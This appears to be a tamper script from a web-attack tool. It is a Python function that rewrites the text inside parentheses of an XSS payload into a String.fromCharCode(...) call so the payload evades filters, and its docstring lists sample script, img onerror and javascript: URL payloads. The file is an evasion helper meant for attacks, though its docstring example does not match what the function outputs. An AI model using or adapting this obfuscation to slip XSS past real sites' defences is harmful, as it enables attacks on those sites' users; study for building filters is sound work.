# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY
__priority__ = PRIORITY.HIGHEST



def tamper(payload, **kwargs):
    """
   

    >>> tamper("<script src=# onerror=alert(1)>")
    <img src=x onerror=alert(String.fromCharCode(88,83,83));>
    <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
    """
    string=re.sub(r"(?<=\()[\S]*(?=\))",convert_this,str(payload))

    return (string) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    for letter in string:
        new_word.append(str(ord(letter)))
    new_word='String.fromCharCode('+','.join(new_word)+')'
    return new_word
